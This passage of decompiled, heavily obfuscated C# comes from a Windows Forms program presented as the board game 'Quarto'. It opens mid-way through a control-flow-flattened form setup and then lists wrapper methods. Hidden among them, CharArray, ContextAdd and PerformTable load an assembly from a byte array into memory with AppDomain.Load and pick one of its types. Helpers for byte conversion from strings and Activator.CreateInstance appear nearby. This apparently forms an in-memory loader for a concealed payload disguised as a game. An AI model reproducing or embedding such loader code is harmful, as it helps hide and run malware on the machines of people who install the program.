					Form1.smethod_75((Control)(object)label1, (DockStyle)4);
					num = ((int)num2 * -329115570) ^ -843911051;
					continue;
				case 33u:
					Form1.smethod_61((Control)(object)button1, "button1");
					num = (int)(num2 * 1672227876) ^ -1375721772;
					continue;
				case 32u:
					Form1.smethod_4((Control)(object)label5, new Point(197, 0));
					num = (int)(num2 * 1824387200) ^ -125277695;
					continue;
				case 31u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = (int)(num2 * 1836856936) ^ -1785971497;
					continue;
				case 30u:
					timer1 = Form1.smethod_56(components);
					num = ((int)num2 * -706299080) ^ -370091546;
					continue;
				case 28u:
					num = (int)(num2 * 1590381954) ^ -1671357676;
					continue;
				case 27u:
					num = (int)(num2 * 1807299464) ^ -1403718035;
					continue;
				case 26u:
					Form1.smethod_90((ISupportInitialize)pictureBox1);
					num = ((int)num2 * -1813391936) ^ 0x2CB36508;
					continue;
				case 25u:
					Form1.smethod_64((Control)(object)label5, 12);
					num = (int)((num2 * 1881558647) ^ 0x128AC0A5);
					continue;
				case 24u:
					num = (int)(num2 * 1677011342) ^ -680992735;
					continue;
				case 23u:
					button2 = Form1.smethod_53();
					button1 = Form1.smethod_53();
					num = ((int)num2 * -667052224) ^ -599807832;
					continue;
				case 22u:
					Form1.smethod_77((Control)(object)label5, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = ((int)num2 * -1097972578) ^ -4698011;
					continue;
				case 21u:
					Form1.smethod_88((Form)(object)this, (EventHandler)Form1_Shown);
					num = (int)((num2 * 1592671137) ^ 0x6BF90080);
					continue;
				case 20u:
					Form1.smethod_77((Control)(object)label2, Form1.smethod_76("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)204));
					num = (int)(num2 * 593955123) ^ -478524463;
					continue;
				case 19u:
					num = (int)((num2 * 1708227008) ^ 0x20F0694C);
					continue;
				case 18u:
					Form1.smethod_4((Control)(object)richTextBox1, new Point(107, 275));
					Form1.smethod_61((Control)(object)richTextBox1, "richTextBox1");
					num = (int)(num2 * 246460919) ^ -1921034346;
					continue;
				case 17u:
					num = ((int)num2 * -731402402) ^ 0x1DDABF0A;
					continue;
				case 16u:
					num = ((int)num2 * -1494058238) ^ 0x4AC91BF;
					continue;
				case 15u:
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)((num2 * 1433319047) ^ 0x1FF0BFDD);
					continue;
				case 14u:
					Form1.smethod_64((Control)(object)button1, 5);
					num = ((int)num2 * -352139635) ^ 0x25361013;
					continue;
				case 13u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					num = (int)((num2 * 393137162) ^ 0x77DF43E5);
					continue;
				case 12u:
					Form1.smethod_75((Control)(object)label2, (DockStyle)3);
					num = (int)((num2 * 27910399) ^ 0x2AF3AB6D);
					continue;
				case 11u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = ((int)num2 * -1182051574) ^ -1787552211;
					continue;
				case 10u:
					Form1.smethod_5((Control)(object)this, Color.White);
					num = (int)(num2 * 415455024) ^ -1400147832;
					continue;
				case 9u:
					Form1.smethod_32((Control)(object)this, "Quarto");
					num = (int)(num2 * 862405924) ^ -459920108;
					continue;
				case 8u:
					num = (int)(num2 * 623067608) ^ -963844334;
					continue;
				case 7u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = ((int)num2 * -957040099) ^ -2067476363;
					continue;
				case 6u:
					Form1.smethod_3((Control)(object)label6, new Size(0, 16));
					num = (int)((num2 * 1505773722) ^ 0x3512B719);
					continue;
				case 5u:
					Form1.smethod_3((Control)(object)button1, new Size(83, 35));
					num = ((int)num2 * -1726755499) ^ -416765754;
					continue;
				case 4u:
					Form1.smethod_3((Control)(object)richTextBox1, new Size(272, 35));
					num = ((int)num2 * -529924439) ^ -1655481066;
					continue;
				case 3u:
					num = 1873647785;
					continue;
				case 2u:
					Form1.smethod_64((Control)(object)richTextBox1, 6);
					num = ((int)num2 * -155763489) ^ -864909766;
					continue;
				case 1u:
					Form1.smethod_4((Control)(object)label2, new Point(0, 0));
					num = ((int)num2 * -607785648) ^ -91031175;
					continue;
				case 0u:
					Form1.smethod_58((ISupportInitialize)pictureBox1);
					Form1.smethod_59((Control)(object)this);
					num = ((int)num2 * -1608020763) ^ 0x7D4750B;
					continue;
				default:
					return;
				case 29u:
					break;
				case 82u:
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = ContextAdd(Level);
		PerformTable(q);
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = Form1.smethod_94(Form1.smethod_93(), Position);
		while (true)
		{
			int num = -712370257;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x9D87D72Au) % 3u)
				{
				case 2u:
					goto IL_000e;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_000e:
				num = (int)(num2 * 545603731) ^ -1220861387;
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
